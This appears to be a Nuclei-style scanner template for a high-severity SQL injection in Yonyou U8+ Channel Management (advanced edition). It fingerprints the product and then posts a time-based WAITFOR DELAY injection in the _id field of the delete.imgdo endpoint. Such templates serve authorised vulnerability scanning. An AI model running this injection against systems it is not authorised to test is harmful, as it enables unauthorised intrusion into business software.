id: poc-yaml-yongyon-u8-cm-ae-delete-imgdo-sqli
info:
  name: 用友U8+渠道管理(高级版) delete.imgdo SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in 用友U8+渠道管理(高级版) affecting delete.imgdo endpoint.

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - path:
      - "{{BaseURL}}/indexbusiness.jsp"
    method: GET
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - "渠道管理（高级版）"

  - path:
      - "{{BaseURL}}/business/test/delete.imgdo"
    method: POST
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "_id=';WAITFOR DELAY '0:0:{{t1}}'--"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - '{"message":0}'
      - type: word
        part: body
        negative: true
        words:
          - "<"
      - type: dsl
        dsl:
          - "duration > to_number(t1) && duration < to_number(t2)"
